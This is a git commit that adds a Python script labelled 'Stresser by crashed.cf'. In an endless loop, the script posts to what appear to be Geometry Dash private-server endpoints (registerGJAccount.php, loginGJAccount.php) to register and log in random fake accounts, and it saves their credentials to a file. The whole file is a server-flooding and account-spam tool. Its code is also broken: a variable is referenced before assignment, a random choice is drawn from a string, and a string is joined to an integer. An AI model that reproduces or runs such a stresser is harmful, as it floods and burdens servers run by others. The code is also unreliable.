d4ae1c6e0c330468bb8eedfdaeb5974a139aa9ce
webfreezy <93349147+webfreezy@users.noreply.github.com>
2021-12-25 17:50:50 +0100

    Add files via upload

---
+++ main.py
@@ -0,0 +1,38 @@
+from urllib.request import urlopen
+from threading import Thread
+import time
+import requests
+import random
+import base64
+
+def main():
+    database = database
+    username = username
+    database = random.choice(database)
+    num = random.randint(100000, 100000000)
+    response = print(
+        requests.post(
+          f'{database}accounts/registerGJAccount.php',
+            data={
+              'userName': str(num) + f'{username}',
+                'password': str(num),
+                'email': str(num) + f'{username}'
+            }).status_code)
+    response = print(
+        requests.post(
+          f'{database}accounts/loginGJAccount.php',
+            data={
+              'userName': str(num) + f'{username}',
+                'password': str(num),
+            }).status_code)
+    f = open("accounts.txt", "a")
+    f.write(f"{username}{num}:{num}\n")
+    f.close()
+    print("username number + pass" + num)
+
+print("Stresser by crashed.cf")
+print("СЛИТО FREEZY")
+database = input("base url:")
+username = input("username before the number:")
+while True:
+    main()
